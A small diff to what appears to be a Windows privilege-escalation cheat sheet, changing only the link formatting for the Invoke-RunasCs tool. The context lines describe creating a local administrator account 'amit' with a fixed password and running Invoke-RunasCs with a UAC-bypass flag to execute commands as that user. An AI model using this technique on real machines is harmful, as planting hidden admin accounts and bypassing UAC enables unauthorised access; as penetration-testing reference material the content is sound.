@@ -8,5 +8,5 @@ Check if enabled:
 1. Creating the user `amit` with the password `Password123!` 
 2. Adding the user to the local administrators group. 
 
-Then we can use `Invoke-RunasCs(https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1)` to get code execution as the newly created amit user:
+Then we can use `[Invoke-RunasCs]([url](https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1))` to get code execution as the newly created amit user:
 - `Invoke-RunasCs amit 'Password123!' 'whoami /priv' -ForceProfile -CreateProcessFunction 2 -BypassUac`
